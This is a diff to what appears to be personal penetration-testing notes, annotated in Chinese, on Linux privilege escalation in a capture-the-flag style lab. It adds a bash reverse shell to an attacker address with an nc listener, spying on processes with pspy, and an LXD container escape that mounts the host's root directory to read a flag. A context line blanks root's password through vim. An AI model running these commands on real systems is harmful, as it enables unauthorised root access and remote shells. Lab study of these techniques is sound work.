@@ -112,3 +112,28 @@ find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \
 echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd      cap_dac_override 权能，清空了root的密码，接着 su root，交互式用 vim 改也行
 
 
+./pspy64 -pf -i 1000      同时监控进程和文件系统事件，并且每秒扫描一次
+  https://github.com/DominicBreuker/pspy
+编辑被执行 sh 文件，添加单行反向 shell
+最后一行添加  bash -i >& /dev/tcp/10.10.14.3/443 0>&1
+  https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+nc -lnvp 443
+
+
+LXC      程序容器
+LXD      系统容器
+必须属于 lxc 或 lxd 组
+
+ssh
+cd ContainerImages/
+ls
+  alpine-v3.18-x86_64-20230607_1234.tar.gz
+lxc image import ./alpine-v3.18-x86_64-20230607_1234.tar.gz --alias alpine-container
+lxc image list
+lxc init alpine-container privesc -c security.privileged=true                                关闭了用户 ID 映射（UID mapping），使容器内的 root 用户和宿主机上的 root 用户完全等同
+lxc config device add privesc host-root disk source=/root path=/mnt/root recursive=true      向容器添加一个磁盘设备，将宿主机的根目录 / 挂载到容器内的 /mnt/root 路径，设置 recursive=true 以递归挂载整个文件系统
+lxc start privesc
+lxc exec privesc /bin/sh                                                                     在容器内启动一个 shell, 拥有宿主机的 root 权限
+cat /mnt/root/flag.txt
+
+
